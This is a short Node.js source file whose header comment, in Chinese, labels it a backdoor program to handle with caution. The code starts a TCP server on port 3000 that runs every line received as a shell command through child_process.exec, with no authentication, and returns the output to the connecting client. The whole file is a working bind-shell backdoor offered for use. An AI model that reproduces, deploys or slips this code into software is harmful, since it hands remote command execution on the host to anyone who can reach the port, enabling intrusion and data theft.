/**
 * 后门程序，谨慎操作
 */

var net = require('net');
var exec = require('child_process').exec;
var server = net.createServer(function(conn) {
    conn.setEncoding('utf8');
    conn.write('\n');
    conn.on('data', function(data) {
        data = data.replace('\r\n', '');
        exec(data, function(error, stdout) {
            if (error !== null) {
                conn.write(error + '\n');
                return false;
            }
            conn.write('########################start\n\n' + stdout + '\n########################end\n\n');
        });
    });
});

server.listen(3000, function() {
    console.log('OK');
});